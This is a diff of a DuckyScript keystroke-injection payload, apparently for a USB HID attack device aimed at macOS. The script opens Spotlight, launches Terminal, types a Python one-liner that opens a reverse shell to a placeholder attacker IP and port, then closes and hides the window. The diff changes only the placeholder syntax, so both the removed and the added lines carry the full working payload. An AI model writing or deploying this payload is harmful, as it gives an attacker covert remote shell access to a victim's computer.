@@ -1,14 +1,9 @@
-REM Creates a reverse shell using Python2
-DELAY #START_DELAY
+DELAY {START_DELAY}
 COMMAND SPACE
-DELAY #SEARCH_DELAY
+DELAY {SEARCH_DELAY}
 STRING terminal
 ENTER
-DELAY #TERMINAL_DELAY
-STRING python -c 'import socket,os,pty;o=os.dup2;s=socket.socket();s.connect(("
-STRING #IP
-STRING ",
-STRING #PORT
-STRING ));f=s.fileno();o(f,0);o(f,1);o(f,2);pty.spawn("/bin/sh")' &! exit
+DELAY {TERMINAL_DELAY}
+STRING python -c 'import socket,os,pty;o=os.dup2;s=socket.socket();s.connect(("{IP}",{PORT}));f=s.fileno();o(f,0);o(f,1);o(f,2);pty.spawn("/bin/sh")' &! exit
 ENTER
 COMMAND h
